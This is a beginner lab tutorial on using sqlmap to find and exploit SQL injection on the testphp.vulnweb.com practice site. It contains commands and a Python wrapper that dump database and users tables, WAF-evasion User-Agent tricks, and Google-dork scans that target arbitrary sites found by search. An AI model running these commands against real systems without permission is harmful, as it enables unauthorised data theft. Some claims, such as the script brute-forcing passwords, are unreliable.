# Web Applications vulnerability Assessment with SQLMap

## Owerview



## LAB TOOLS 



## scop



## Introduction
### What is SQLMAP
sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.


## Environment Setup:
### SQLMAP
- Installation on Kali Linux
````
sudo apt update
sudo apt install sqlmap -y
````
<img width="870" height="540" alt="image" src="https://github.com/user-attachments/assets/77da5ea2-11be-496f-9c06-003f5609189d" />


- Update sqlmap:
````
sudo sqlmap --update
````
<img width="914" height="350" alt="image" src="https://github.com/user-attachments/assets/ac7c8d03-2ca6-49d8-a3f4-46a119f4f251" />

- Check
````
sqlmap
````
<img width="918" height="226" alt="image" src="https://github.com/user-attachments/assets/93fa87b1-a94d-40cf-9a99-cefaabdd61da" />


### Target
-In this used `Vulnweb`:
<img width="992" height="351" alt="image" src="https://github.com/user-attachments/assets/eebfa303-32b1-400e-a200-d933f9c79194" />

- Go to this URL: http://testphp.vulnweb.com/
<img width="1010" height="712" alt="image" src="https://github.com/user-attachments/assets/b7307fc0-c14e-4408-9d7a-b7a076d48871" />





### SQLMAP Usage Options

| Category                    |                                Option(s) | What it does (plain English)                                                                                                                            | Example / Notes                                           |
| --------------------------- | ---------------------------------------: | ------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------- |
| Verbosity                   |                             `-v VERBOSE` | Set verbosity level (0‚Äì6). Higher = more detailed output. Default is 1.                                                                                 | `-v 3` ‚Äî show more debugging info.                        |
| **Target**                  |              **(at least one required)** | **Define the target(s) to test**                                                                                                                        |                                                           |
|                             |                    `-u URL`, `--url=URL` | Target URL to test (single URL).                                                                                                                        | `-u "http://site/vuln.php?id=1"`                          |
|                             |                          `-g GOOGLEDORK` | Use Google dork results as target URLs.                                                                                                                 | `-g "inurl:php?id="`                                      |
| **Request**                 |           **How to send data / connect** |                                                                                                                                                         |                                                           |
|                             |                            `--data=DATA` | Send a POST data string (tests POST parameters).                                                                                                        | `--data="id=1&name=foo"`                                  |
|                             |                        `--cookie=COOKIE` | Provide an HTTP Cookie header value for requests.                                                                                                       | `--cookie="PHPSESSID=abc123; security=low"`               |
|                             |                         `--random-agent` | Use a randomly selected User-Agent header.                                                                                                              | Useful to avoid simple UA-based blocking.                 |
|                             |                          `--proxy=PROXY` | Route requests through a proxy (host:port).                                                                                                             | `--proxy="http://127.0.0.1:8080"`                         |
|                             |                                  `--tor` | Route traffic through the Tor network.                                                                                                                  | Requires Tor running locally.                             |
|                             |                            `--check-tor` | Verify that Tor is being used properly.                                                                                                                 | Run after `--tor`.                                        |
| **Injection**               | **Define parameters & payload behavior** |                                                                                                                                                         |                                                           |
|                             |                       `-p TESTPARAMETER` | Specify which parameter(s) to test (e.g., `id`, `name`).                                                                                                | `-p id` or `-p "id,name"`                                 |
|                             |                            `--dbms=DBMS` | Force/assume a particular DBMS type (e.g., `MySQL`, `MSSQL`).                                                                                           | `--dbms=MySQL` ‚Äî narrows tests to DB-specific techniques. |
| **Detection**               |  **Control detection depth / intensity** |                                                                                                                                                         |                                                           |
|                             |                          `--level=LEVEL` | Level of tests to perform (1‚Äì5). Higher = more tests. Default 1.                                                                                        | `--level=3` ‚Äî more thorough checks (slower).              |
|                             |                            `--risk=RISK` | Risk level of tests (1‚Äì3). Higher = riskier payloads. Default 1.                                                                                        | `--risk=2` ‚Äî allows tests that are somewhat intrusive.    |
| **Techniques**              |                     `--technique=TECH..` | Choose SQLi techniques to use. Default is `BEUSTQ`. Letters map to techniques (e.g., B=boolean, E=error, U=UNION, S=stacked, T=time, Q=inline queries). | `--technique=BE` ‚Äî only boolean & error-based tests.      |
| **Enumeration**             |          **Extract DB info / dump data** | `-a` retrieves everything; other flags target specific items.                                                                                           |                                                           |
|                             |                              `-a, --all` | Try to retrieve everything (banner, users, dbs, tables, data).                                                                                          | Very comprehensive ‚Äî usually slow.                        |
|                             |                           `-b, --banner` | Retrieve DBMS banner (version/info).                                                                                                                    | Quick info about DB engine/version.                       |
|                             |                         `--current-user` | Get DBMS current user.                                                                                                                                  | Shows the database user used by the app.                  |
|                             |                           `--current-db` | Get current database name.                                                                                                                              | Useful to focus further enumeration.                      |
|                             |                            `--passwords` | Enumerate DBMS user password hashes (if possible).                                                                                                      | High sensitivity ‚Äî careful in real tests.                 |
|                             |                                  `--dbs` | List available databases.                                                                                                                               | `--dbs` ‚Äî common first enumeration step.                  |
|                             |                               `--tables` | List tables (requires `-D DB` to specify database).                                                                                                     | `--tables -D users_db`                                    |
|                             |                              `--columns` | List columns in tables (requires `-D` and `-T`).                                                                                                        | `--columns -D shop -T products`                           |
|                             |                               `--schema` | Retrieve the DB schema.                                                                                                                                 | Higher-level view of DB structure.                        |
|                             |                                 `--dump` | Dump table entries (requires target DB/TBL/columns).                                                                                                    | `--dump -D shop -T users`                                 |
|                             |                             `--dump-all` | Dump entries for all DB tables.                                                                                                                         | Very noisy/slow ‚Äî use only in lab or with permission.     |
|                             |                                  `-D DB` | Specify DB name for enumeration.                                                                                                                        | `-D example_db`                                           |
|                             |                                 `-T TBL` | Specify table(s) to enumerate within `-D`.                                                                                                              | `-T users`                                                |
|                             |                                 `-C COL` | Specify column(s) to extract within `-T`.                                                                                                               | `-C "id,username,password"`                               |
| **Operating system access** | **Attempt OS-level access if DB allows** | These enable heavy, potentially destructive options ‚Äî require explicit permission and safe lab environments.                                            |                                                           |
|                             |                             `--os-shell` | Prompt for an interactive OS shell (if achievable).                                                                                                     | Very powerful; use only in isolated labs.                 |
|                             |                               `--os-pwn` | Try for OOB shell (Meterpreter/VNC) ‚Äî high-risk.                                                                                                        | Do **not** run against production systems.                |
| **General**                 |        **Session & automation controls** |                                                                                                                                                         |                                                           |
|                             |                                `--batch` | Run non-interactively: accept defaults (no prompts).                                                                                                    | Useful for scripts/automation.                            |
|                             |                        `--flush-session` | Clear saved session files for the current target.                                                                                                       | Use when changing testing parameters or starting fresh.   |
| **Miscellaneous**           |              **Helpers & beginner mode** |                                                                                                                                                         |                                                           |
|                             |                               `--wizard` | Interactive beginner-friendly wizard.                                                                                                                   | Guides you through common options step-by-step.           |



### Get help
````
sqlmap -hh
````
<img width="963" height="822" alt="image" src="https://github.com/user-attachments/assets/8dfb70c8-3d37-4ec5-96a3-22722d06b492" />

#### SQLMap Options (v1.9.9.4#dev) in Table Form
| **Category**     | **Option / Flag** | **Description**              |
| ---------------- | ----------------- | ---------------------------- |
| **General Help** | `-h`, `--help`    | Show basic help and exit     |
|                  | `-hh`             | Show advanced help and exit  |
|                  | `--version`       | Show sqlmap version and exit |
|                  | `-v <0-6>`        | Verbosity level (default 1)  |


#### Target Options
| **Option / Flag** | **Description**                                    |
| ----------------- | -------------------------------------------------- |
| `-u URL`          | Target URL (e.g., `http://site.com/vuln.php?id=1`) |
| `-d DIRECT`       | Direct DB connection string                        |
| `-l LOGFILE`      | Parse targets from Burp/WebScarab log file         |
| `-m BULKFILE`     | Scan multiple targets from file                    |
| `-r REQUESTFILE`  | Load raw HTTP request from file                    |
| `-g GOOGLEDORK`   | Use Google dork results as target URLs             |
| `-c CONFIGFILE`   | Load options from INI config file                  |



#### Request Options
| **Option / Flag**    | **Description**                          |
| -------------------- | ---------------------------------------- |
| `-A`, `--user-agent` | Set User-Agent header                    |
| `-H`, `--header`     | Extra header (e.g., `X-Forwarded-For`)   |
| `--method=METHOD`    | Force HTTP method (GET, POST, PUT, etc.) |
| `--data=DATA`        | POST data (e.g., `id=1`)                 |
| `--cookie=COOKIE`    | Cookie header (e.g., `PHPSESSID=...`)    |
| `--random-agent`     | Use random User-Agent                    |
| `--proxy=PROXY`      | Use a proxy server                       |
| `--tor`              | Use Tor for anonymity                    |
| `--timeout=TIMEOUT`  | Set connection timeout (default 30s)     |
| `--delay=SECONDS`    | Delay between requests                   |
| `--retries=NUM`      | Retry on timeout (default 3)             |
| `--safe-url`         | Visit a safe URL during testing          |
| `--csrf-token`       | Parameter holding anti-CSRF token        |
| `--csrf-url`         | URL to extract CSRF token                |
| `--ignore-code=CODE` | Ignore specific HTTP error codes         |
| `--ignore-redirects` | Ignore redirects                         |



#### Optimization
| **Option / Flag**   | **Description**                     |
| ------------------- | ----------------------------------- |
| `-o`                | Enable all optimizations            |
| `--threads=NUM`     | Number of concurrent requests       |
| `--keep-alive`      | Use persistent connections          |
| `--null-connection` | Retrieve page length only (no body) |



#### Injection Options
| **Option / Flag**      | **Description**                              |
| ---------------------- | -------------------------------------------- |
| `-p PARAM`             | Testable parameter(s)                        |
| `--skip=PARAM`         | Skip specific parameter(s)                   |
| `--param-filter=PLACE` | Select parameters by place (GET, POST, etc.) |
| `--dbms=DBMS`          | Force backend DBMS type                      |
| `--prefix=STRING`      | Payload prefix                               |
| `--suffix=STRING`      | Payload suffix                               |
| `--tamper=SCRIPT`      | Use tamper scripts                           |



#### Detection
| **Option / Flag**     | **Description**            |
| --------------------- | -------------------------- |
| `--level=1-5`         | Test intensity (default 1) |
| `--risk=1-3`          | Risk level (default 1)     |
| `--string=STRING`     | Match string if True       |
| `--not-string=STRING` | Match string if False      |
| `--regexp=REGEXP`     | Regex for True condition   |
| `--code=CODE`         | Match HTTP code if True    |



#### Techniques
| **Option / Flag**    | **Description**                           |
| -------------------- | ----------------------------------------- |
| `--technique=TECH`   | Choose SQLi techniques (B, E, U, S, T, Q) |
| `--time-sec=N`       | Delay for time-based tests                |
| `--union-cols=RANGE` | Test UNION column count                   |
| `--union-char=CHAR`  | Character for UNION bruteforce            |




#### Fingerprint
| **Option / Flag**     | **Description**               |
| --------------------- | ----------------------------- |
| `-f`, `--fingerprint` | Extensive DBMS fingerprinting |




#### Enumeration
| **Option / Flag** | **Description**           |
| ----------------- | ------------------------- |
| `-a`, `--all`     | Dump everything           |
| `-b`, `--banner`  | Get DBMS banner           |
| `--current-user`  | Get current DB user       |
| `--current-db`    | Get current DB name       |
| `--hostname`      | Get DB hostname           |
| `--is-dba`        | Check if user is DBA      |
| `--users`         | Enumerate DB users        |
| `--passwords`     | Dump user password hashes |
| `--dbs`           | List databases            |
| `--tables`        | List tables               |
| `--columns`       | List columns              |
| `--schema`        | Dump schema               |
| `--dump`          | Dump table entries        |
| `--dump-all`      | Dump all data             |
| `-D DB`           | Select database           |
| `-T TABLE`        | Select table              |
| `-C COLUMN`       | Select column             |



#### Brute Force
| **Option / Flag**  | **Description**      |
| ------------------ | -------------------- |
| `--common-tables`  | Check common tables  |
| `--common-columns` | Check common columns |
| `--common-files`   | Check common files   |



#### File System Access
| **Option / Flag**   | **Description**            |
| ------------------- | -------------------------- |
| `--file-read=FILE`  | Read file from server      |
| `--file-write=FILE` | Write local file to server |
| `--file-dest=PATH`  | Destination path on server |



#### OS Access
| **Option / Flag** | **Description**           |
| ----------------- | ------------------------- |
| `--os-cmd=CMD`    | Run OS command            |
| `--os-shell`      | Interactive OS shell      |
| `--os-pwn`        | OOB shell/Meterpreter/VNC |
| `--priv-esc`      | Try privilege escalation  |



#### Windows Registry
| **Option / Flag** | **Description**     |
| ----------------- | ------------------- |
| `--reg-read`      | Read registry key   |
| `--reg-add`       | Add registry key    |
| `--reg-del`       | Delete registry key |
| `--reg-key=KEY`   | Registry key path   |


#### General Options
| **Option / Flag** | **Description**           |
| ----------------- | ------------------------- |
| `-s FILE`         | Load session file         |
| `-t FILE`         | Log HTTP traffic to file  |
| `--batch`         | Never ask user input      |
| `--crawl=DEPTH`   | Crawl target site         |
| `--flush-session` | Clear session files       |
| `--forms`         | Parse and test HTML forms |
| `--update`        | Update sqlmap             |



#### Miscellaneous
| **Option / Flag** | **Description**                   |
| ----------------- | --------------------------------- |
| `-z MNEMONICS`    | Short mnemonics (e.g., `flu,bat`) |
| `--alert=CMD`     | Run OS command on finding SQLi    |
| `--beep`          | Beep when SQLi is found           |
| `--list-tampers`  | List tamper scripts               |
| `--wizard`        | Wizard interface for beginners    |




## Debugging and analysis modes

- Go to our target:
<img width="1021" height="801" alt="image" src="https://github.com/user-attachments/assets/1409279f-a4e0-45c7-a092-a48cd9beffb8" />

- Copy this parameter: http://testphp.vulnweb.com/artists.php?artist=2
<img width="1013" height="658" alt="image" src="https://github.com/user-attachments/assets/ecc722bd-5d12-4cbc-b23e-d3f56b433c06" />



### Verbose
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" -vvvv
````
<img width="1704" height="759" alt="image" src="https://github.com/user-attachments/assets/72ec9087-0b42-479b-9fff-4973513593c6" />

<img width="676" height="658" alt="image" src="https://github.com/user-attachments/assets/fbee3474-b29d-4c3a-a3f0-98d4d77ced6c" />

- We also see `Payloads`
- Verbose options:
| LEVEL | OUTPUT DETAILS                                          |
|-------|--------------------------------------------------------|
| 0     | Show only Python tracebacks, error and critical messages. |
| 1     | Show also information and warning messages. (Default)  |
| 2     | Show also debug messages.                              |
| 3     | Show also payloads injected.                           |
| 4     | Show also HTTP requests.                               |
| 5     | Show also HTTP responses‚Äô headers.                     |
| 6     | Show also HTTP responses‚Äô page content.                |


````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" -vvvvvvv
````
<img width="1717" height="818" alt="image" src="https://github.com/user-attachments/assets/fd9a93ed-2213-40af-991f-612911a07f5d" />

- We also see `Response`
<img width="992" height="781" alt="image" src="https://github.com/user-attachments/assets/6ad5ec00-88ff-4be2-9097-2545e5c19476" />

<img width="1272" height="715" alt="image" src="https://github.com/user-attachments/assets/6df04ec1-17c5-44b3-be32-b21ed4d7441f" />

- Remember SQLMAP take `-u` or `URL` with parameter.
- If we use it without `Parameter`
<img width="1673" height="416" alt="image" src="https://github.com/user-attachments/assets/c187ba9b-815a-43a4-b8c9-ca76c2c15ec9" />



### Direct
````
sqlmap -d "mysql://administrator:password@testphp.vulnweb.com:3306/test"
````
<img width="919" height="408" alt="image" src="https://github.com/user-attachments/assets/b20c7f3e-83fb-43a7-9bd3-1a9617b444c0" />

- This tells sqlmap to connect directly to a MySQL database using the provided connection string. It is not the same as scanning a web application for SQL injection ‚Äî -d gives sqlmap database credentials/connection info so it can talk to the DB server directly.
- But in this we Can't connect to MySQL server.
- `mysql://`  : DBMS dialect. Here it means MySQL (sqlmap will try to use a MySQL driver).
- `administrator`  : username used to authenticate to the DB.
- `password`  : password for that DB user. (If the password contains special characters, it must be URL-encoded.)
- `testphp.vulnweb.com`  :  hostname (or IP) of the DB server.
- `:3306` : port number (3306 is the default MySQL port).
- `/test` : database name to use/connect to (optional in many cases ‚Äî some tools still connect without specifying).

#### Install zapproxy
````
sudo apt install zaproxy
````
<img width="905" height="560" alt="image" src="https://github.com/user-attachments/assets/2f0e029e-c273-4f18-85b9-a190f9ebfdc0" />

````
zaproxy
````
<img width="922" height="732" alt="image" src="https://github.com/user-attachments/assets/57cf0243-b06d-4667-9db1-577696662959" />

<img width="790" height="592" alt="image" src="https://github.com/user-attachments/assets/100f2e17-e8d9-4892-a5f3-ca020a0334f2" />

- After go to browser:
<img width="918" height="676" alt="image" src="https://github.com/user-attachments/assets/3b8fd26c-bfcc-422e-8dd2-54efaf81c775" />

- Or we can go to direct link: https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
<img width="906" height="467" alt="image" src="https://github.com/user-attachments/assets/1adb8127-5a0e-4588-8cdd-4df98b86380a" />

<img width="475" height="247" alt="image" src="https://github.com/user-attachments/assets/eac7752b-afd4-45c4-bec3-ebaa9847f0dc" />

<img width="517" height="283" alt="image" src="https://github.com/user-attachments/assets/eb80dc6f-4090-41f0-b713-2a11940a3703" />

- And we click on `Pin`


<img width="376" height="387" alt="image" src="https://github.com/user-attachments/assets/578a4149-e1e0-4b9e-a868-34e59112fd6f" />

<img width="491" height="137" alt="image" src="https://github.com/user-attachments/assets/e15b6658-4fcd-459d-8658-7b66f5e1168f" />

<img width="927" height="535" alt="image" src="https://github.com/user-attachments/assets/37f391c4-242c-46f8-9fc2-dda9078acd07" />

- After we click on `Save` we get a proxy:
<img width="298" height="327" alt="image" src="https://github.com/user-attachments/assets/17299fda-6f6e-4731-a274-044eba79ec4b" />

- To set with certificate go to new tab and type `about:config`: 
<img width="925" height="752" alt="image" src="https://github.com/user-attachments/assets/93bec53b-6662-48a4-85b5-d582b92f809f" />

<img width="927" height="341" alt="image" src="https://github.com/user-attachments/assets/8a140f2b-8104-4292-97d3-a221e49e2c62" />

<img width="930" height="640" alt="image" src="https://github.com/user-attachments/assets/d71f554b-cdda-4725-be8d-42fcec1cb32e" />

<img width="362" height="741" alt="image" src="https://github.com/user-attachments/assets/33a84aa6-4b9d-4d25-a12b-68df81cb9734" />

<img width="932" height="557" alt="image" src="https://github.com/user-attachments/assets/af40093a-cb6b-4202-835a-ffb69e38b7fb" />

- after go back to our `ZAP` 
<img width="920" height="624" alt="image" src="https://github.com/user-attachments/assets/196222e6-8b36-4ec8-a458-f7c879d02ee0" />

<img width="741" height="577" alt="image" src="https://github.com/user-attachments/assets/dbced223-7e0b-46fc-832e-5bb398ed395a" />

<img width="473" height="172" alt="image" src="https://github.com/user-attachments/assets/7d970bca-eb5d-4e61-8d97-53f7568dbd2d" />

<img width="738" height="580" alt="image" src="https://github.com/user-attachments/assets/1d71e8a9-09e6-4189-8a1f-b637281cc152" />

<img width="671" height="352" alt="image" src="https://github.com/user-attachments/assets/1e7d8765-9a42-4858-b80e-ba05a59b0771" />

<img width="672" height="322" alt="image" src="https://github.com/user-attachments/assets/2482bba3-7659-42e4-b7f0-fcc140c34fcd" />

<img width="665" height="458" alt="image" src="https://github.com/user-attachments/assets/8f29948a-3f21-4139-9b36-55972b8205c8" />

<img width="911" height="790" alt="image" src="https://github.com/user-attachments/assets/6b643217-9672-4a55-a444-87affa4e6a7e" />

<img width="783" height="305" alt="image" src="https://github.com/user-attachments/assets/9f66c4b3-9a04-4fc0-9460-46dad9b430bd" />

<img width="663" height="458" alt="image" src="https://github.com/user-attachments/assets/7281c35f-bc3b-4cc5-804c-d72cf850de9b" />

<img width="928" height="615" alt="image" src="https://github.com/user-attachments/assets/3f5148d3-a223-4ba0-8913-5340c5b565ab" />

- In our `ZAP` we see this:
<img width="923" height="677" alt="image" src="https://github.com/user-attachments/assets/fff9eead-e626-4163-87f2-cf52e96eefb5" />

- Double click on it:
<img width="1091" height="848" alt="image" src="https://github.com/user-attachments/assets/d307c9fd-8634-4430-b75c-c00e29375332" />

<img width="670" height="355" alt="image" src="https://github.com/user-attachments/assets/aa8a3297-1d71-4581-91e8-89f4f3b0ff50" />

- In our `File` we will see: 
<img width="870" height="683" alt="image" src="https://github.com/user-attachments/assets/ddecb993-c2a5-4d03-8442-897c4541908e" />

<img width="1672" height="866" alt="image" src="https://github.com/user-attachments/assets/642719ad-5123-4613-bab6-6652d2df6246" />

<img width="795" height="532" alt="image" src="https://github.com/user-attachments/assets/4a8c28e1-f50f-48cd-9b22-b89924ec8819" />

<img width="793" height="325" alt="image" src="https://github.com/user-attachments/assets/5e0e0f06-413c-4719-b213-24c6b2ddee0d" />

- We see this and press `Enter`:
````
sqlmap -l /home/k4n0ng/owasp.raw
Y
Y
Y
````
<img width="1701" height="829" alt="image" src="https://github.com/user-attachments/assets/d61d588e-bb5f-481b-8cfa-eac2aff72d3c" />

- -l: Load target(s) from a log file (owasp.raw) ‚Äî likely captured via Burp Suite or similar.

````
sqlmap -l /home/k4n0ng/owasp.raw --time-sec=10
````
<img width="1191" height="808" alt="image" src="https://github.com/user-attachments/assets/63f4c67a-fc60-4f3a-96c3-4f9c5a5cfab7" />

<img width="1776" height="737" alt="image" src="https://github.com/user-attachments/assets/59ecc795-8f53-4678-b506-63723021b941" />

- This command to give sqlmap more time to detect delays.
- Check:
````
cat /home/k4n0ng/.local/share/sqlmap/output/results-09302025_0956am.csv
````
<img width="657" height="96" alt="image" src="https://github.com/user-attachments/assets/d9860043-3e4f-4bd1-92f3-0e6d2b5a6c46" />


#### Exploit it:
##### Dump Database Names
````
sqlmap -l /home/k4n0ng/owasp.raw --dbs
````
<img width="1658" height="840" alt="image" src="https://github.com/user-attachments/assets/409080fe-747d-4b0a-a026-2157eb8b2339" />

#####  Dump Tables from acuart Database
````
sqlmap -l /home/k4n0ng/owasp.raw -D acuart --tables
````
<img width="1411" height="674" alt="image" src="https://github.com/user-attachments/assets/8d298e22-697d-41c8-b8e3-5c87aec0dc2a" />

<img width="1351" height="369" alt="image" src="https://github.com/user-attachments/assets/2f645c56-59f1-4aee-bea0-5fd217767493" />


##### Dump Specific Table (e.g., users)
````
sqlmap -l /home/k4n0ng/owasp.raw -D acuart -T users --dump
````
<img width="1418" height="679" alt="image" src="https://github.com/user-attachments/assets/04ec28d6-e3e8-4b99-a9c0-3fdcc29ce165" />

<img width="1206" height="733" alt="image" src="https://github.com/user-attachments/assets/6f4aece1-74e6-4c3d-bfbf-9b4d0ebf45b9" />

---
###  Python Script That Runs sqlmap via Subprocess
````
mousepad exploit_acuart.py
````
````
import subprocess
import sys

def run_sqlmap(target_url, options=None):
    """
    Run sqlmap with given URL and optional flags
    """
    cmd = ["sqlmap", "-u", target_url, "--batch"]
    
    if options:
        cmd.extend(options)
    
    print(f"[+] Running: {' '.join(cmd)}")
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        if result.stderr:
            print("[!] Errors:", result.stderr[:500])  # Show first 500 chars
    except FileNotFoundError:
        print("[-] Error: sqlmap not found. Install it first!")
        sys.exit(1)

if __name__ == "__main__":
    # Target: Acunetix acuart (live or local)
    TARGET = "http://testphp.vulnweb.com/artists.php?artist=1"


    print("[*] Starting SQLi exploitation on Acunetix acuart...")
    
    # Step 1: Check if injectable
    run_sqlmap(TARGET, ["--dbs"])
    
    # Step 2: Dump users table
    run_sqlmap(TARGET, ["-D", "acuart", "-T", "users", "--dump"])
    
    print("[*] Done!")
````
<img width="1659" height="718" alt="image" src="https://github.com/user-attachments/assets/042434ef-1185-4204-b1ca-1ceb0b06c6f3" />

````
python exploit_acuart.py
````
<img width="1417" height="774" alt="image" src="https://github.com/user-attachments/assets/f2b0fb8b-64ab-4775-ad75-9deb34bc8df2" />

<img width="1419" height="789" alt="image" src="https://github.com/user-attachments/assets/af5d1f40-174a-4fcf-8932-4cfdbe675655" />

<img width="913" height="718" alt="image" src="https://github.com/user-attachments/assets/4e8f2b8d-e931-46df-8c4f-311c7fceafe4" />

<img width="1145" height="760" alt="image" src="https://github.com/user-attachments/assets/24c31a9e-3cee-4413-ac4f-53702ccde3c8" />

- It will brute forcing Usename and password until correct.



---

- Open our browser again:
- Type this again: http://testphp.vulnweb.com/ , and after right click on `Browser categories` and click `Open link`: 
<img width="873" height="733" alt="image" src="https://github.com/user-attachments/assets/27a4e48b-6bd9-4adf-b289-b090f2fc698b" />

<img width="698" height="704" alt="image" src="https://github.com/user-attachments/assets/3a47a60c-8887-404b-829c-1080743deb2f" />

- Right click on `Posters` -> `Paintings` -> `Stickers` -> `Graffity`,  Right click on all of it we will see this:
<img width="1446" height="706" alt="image" src="https://github.com/user-attachments/assets/ba6d86e7-25ae-4a29-8774-cbe10da44afc" />

<img width="1457" height="896" alt="image" src="https://github.com/user-attachments/assets/bdce1c8a-643b-4c64-85b0-151656b96bdd" />

- Lets create file of all URL:
Right click on it
<img width="572" height="431" alt="image" src="https://github.com/user-attachments/assets/9799a138-4792-4681-81ec-371512dee0f4" />

<img width="303" height="153" alt="image" src="https://github.com/user-attachments/assets/e475c787-f014-44de-8261-482aaeae6f80" />

<img width="1681" height="589" alt="image" src="https://github.com/user-attachments/assets/3b7021f9-f2cc-4288-b381-db91500764f1" />

- Pass all our URL to our file `bulk.txt`:


- In terminal pass our file `bulk.txt`
````
sqlmap -m '/home/k4n0ng/Desktop/bulk.txt' --dbs
````
<img width="1451" height="816" alt="image" src="https://github.com/user-attachments/assets/4ec506f6-a0cd-4bf2-8f99-7795ecb54f5e" />

<img width="1899" height="783" alt="image" src="https://github.com/user-attachments/assets/30945657-1c51-42e8-b4cc-b1ab19b2ec5f" />

- Go to difference parameter:
<img width="1158" height="893" alt="image" src="https://github.com/user-attachments/assets/8c407398-5498-4ae0-a57f-4322dc36f295" />

- After this we will see this:
<img width="1166" height="693" alt="image" src="https://github.com/user-attachments/assets/5c318256-fbd8-4927-8e38-326c22eb09f3" />

<img width="928" height="716" alt="image" src="https://github.com/user-attachments/assets/5300afc2-8d5c-42fc-8716-cb8e555ecc3a" />

<img width="931" height="672" alt="image" src="https://github.com/user-attachments/assets/776fa301-790a-474c-973d-e11c6f58c16d" />

- Copy this: http://testphp.vulnweb.com/artists.php?artist=1
<img width="930" height="800" alt="image" src="https://github.com/user-attachments/assets/396705ea-69f1-44ad-a22e-61525f16e399" />

- Delete all of this:
<img width="844" height="543" alt="image" src="https://github.com/user-attachments/assets/d0df46db-6551-4ccf-8790-798807f5c26c" />

- And past this to our file `bulk.txt`
<img width="839" height="491" alt="image" src="https://github.com/user-attachments/assets/70179a95-0ab3-4295-8a49-590e81770426" />

- In this we have difference parameter.

- Type this to `Search art` and click `go`:
<img width="923" height="645" alt="image" src="https://github.com/user-attachments/assets/82c4e19c-b704-4963-953f-ec90f8fa997b" />

- We will see this:
<img width="938" height="597" alt="image" src="https://github.com/user-attachments/assets/904b6d42-d65a-460e-a579-b071a23aaf2e" />

- Copy this link:
<img width="891" height="671" alt="image" src="https://github.com/user-attachments/assets/42cbb215-8361-46bf-8258-6bcba9455c4c" />

- And past to our file `bulk.txt` after past link click `Save`:
<img width="852" height="326" alt="image" src="https://github.com/user-attachments/assets/9f5088c2-f51f-4ec3-9555-1f6f2dffb62b" />

- And type command again:
````
sqlmap -m '/home/k4n0ng/Desktop/bulk.txt' --dbs
````
<img width="1721" height="463" alt="image" src="https://github.com/user-attachments/assets/d3251dad-e296-491b-9761-72f2299f537d" />

<img width="1717" height="719" alt="image" src="https://github.com/user-attachments/assets/0033c178-4047-42e1-b6a9-66b5dcec48be" />

- In this we see 3 target.
<img width="923" height="675" alt="image" src="https://github.com/user-attachments/assets/306743b7-9adc-4582-9684-054074faacb6" />

<img width="1901" height="862" alt="image" src="https://github.com/user-attachments/assets/54393bdf-16f3-4420-baed-4aa7450891d7" />

<img width="675" height="356" alt="image" src="https://github.com/user-attachments/assets/47ba266f-e314-49ee-aed9-50dbff64d5d7" />

<img width="528" height="498" alt="image" src="https://github.com/user-attachments/assets/2cde8358-4d05-4867-be30-6f3e58fcdd98" />

- In this we see our `request.raw` and open it also choose `Mousepad`:
<img width="533" height="466" alt="image" src="https://github.com/user-attachments/assets/44730c93-ac40-451a-8467-a1377a5d6d84" />

- we will see it the same `URL`:
<img width="1815" height="725" alt="image" src="https://github.com/user-attachments/assets/ec12feaa-7771-4f20-a44d-54ac3ad9455b" />

````
sqlmap -r '/home/k4n0ng/Desktop/request.raw' --dbs
````
<img width="909" height="812" alt="image" src="https://github.com/user-attachments/assets/19925c37-1810-499c-b14d-3d0fce42ee3e" />

<img width="911" height="812" alt="image" src="https://github.com/user-attachments/assets/d91b3155-1886-432a-bef5-7b782703bac1" />

<img width="969" height="807" alt="image" src="https://github.com/user-attachments/assets/631f6ebc-861c-46fa-a7a2-34a2c16c1275" />

- In this we found the vulnerability.
---


###  GOOGLEDORK
````
sqlmap -g "inurl:php?id="
````
<img width="1725" height="820" alt="image" src="https://github.com/user-attachments/assets/a623b382-2dbb-454f-b0cc-4b149a8b4f97" />

<img width="1903" height="754" alt="image" src="https://github.com/user-attachments/assets/46201394-1704-425f-a7dd-28cdf15df26e" />

````
sqlmap -g "inurl:listproducts.php?cat="
````
<img width="907" height="775" alt="image" src="https://github.com/user-attachments/assets/297be637-4cf6-4ed1-958c-4f977d49e909" />



## Headers, cookies, POST data
### Request
#### Agent
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" -A 'Mozilla/4.2' -v5
````
<img width="906" height="570" alt="image" src="https://github.com/user-attachments/assets/ff86afab-390d-4d8c-be4f-014fc9a55ff9" />

<img width="1584" height="781" alt="image" src="https://github.com/user-attachments/assets/35f3df06-aa78-494d-9726-983bf291dc85" />

- In this it give `User-Agent: Mozilla/4.2`

- But if run command this:
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" -v5
````
<img width="909" height="565" alt="image" src="https://github.com/user-attachments/assets/37de3af2-f7e5-4074-b3c2-48c988a571fb" />

- In this it show `sqlmap/1.9.9.4`
- User Agent like this:
<img width="1918" height="862" alt="image" src="https://github.com/user-attachments/assets/901bd053-ac4d-4ea2-8e80-236f50e22769" />

- Or to make it even more realistic:
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
       -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
````
<img width="1681" height="708" alt="image" src="https://github.com/user-attachments/assets/2f685715-9a6c-4b1e-8158-2b6cd80b25ff" />

-  This helps bypass filters that block `unknown` or `automated‚Äù` tools. 

#### SQLMAP REQUEST OPTIONS

````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --random-agent -v5
````
<img width="1877" height="612" alt="image" src="https://github.com/user-attachments/assets/e4594ac8-4a63-4fc3-af3b-dbbe409b024e" />

<img width="1569" height="786" alt="image" src="https://github.com/user-attachments/assets/b196ee92-d735-4cb2-a06d-b5c79b4817d1" />

- `--random-agent -v5` : hen a request is sent to a web server, the browser includes a User-Agent header that identifies the browser and operating system. This header can be flagged by Web Application Firewalls (WAFs) or Intrusion Detection Systems (IDS).
SQLMAP allows you to manually set a custom User-Agent using the -A option.
